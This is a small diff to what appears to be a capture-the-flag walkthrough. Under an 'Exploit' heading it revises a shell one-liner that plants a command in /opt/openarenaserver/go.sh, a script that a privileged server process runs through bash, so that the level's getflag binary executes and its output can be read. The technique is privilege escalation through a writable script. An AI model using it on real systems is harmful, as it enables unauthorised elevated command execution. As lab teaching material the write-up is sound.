@@ -58,8 +58,9 @@ Exploit
 
 ```r
 $ \
-echo '/bin/getflag > /tmp/temp' > /opt/openarenaserver/go.sh && \
-chmod +x /opt/openarenaserver/go.sh
+echo '${which getflag} > /tmp/temp' > /opt/openarenaserver/go.sh && \
+chmod +x /opt/openarenaserver/go.sh && \
+tail -f /tmp/temp
 
 # remember
 # `/usr/sbin/openarenaserver` runs `bash -x` in a subshell
